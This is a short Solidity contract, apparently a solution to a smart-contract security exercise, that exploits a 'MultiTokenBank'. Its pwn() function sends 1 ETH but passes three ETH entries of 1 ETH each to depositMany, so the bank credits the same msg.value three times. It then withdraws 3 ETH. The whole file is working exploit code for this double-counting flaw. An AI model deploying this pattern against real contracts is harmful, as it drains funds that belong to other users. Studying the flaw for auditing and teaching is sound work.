// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IMultiTokenBank {
    function balances(address, address) external view returns (uint);

    function depositMany(address[] calldata, uint[] calldata) external payable;

    function deposit(address, uint) external payable;

    function withdraw(address, uint) external;
}

contract MultiTokenBankExploit {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    IMultiTokenBank public bank;

    constructor(address _bank) {
        bank = IMultiTokenBank(_bank);
    }

    receive() external payable {}

    function pwn() external payable {
        address[] memory tokens = new address[](3);
        tokens[0] = ETH;
        tokens[1] = ETH;
        tokens[2] = ETH;
        
        uint[] memory amounts = new uint[](3);
        amounts[0] = 1e18;
        amounts[1] = 1e18;
        amounts[2] = 1e18;
        

        bank.depositMany{value: 1e18}(tokens, amounts);
        bank.withdraw(ETH, 3 * 1e18);
    }
}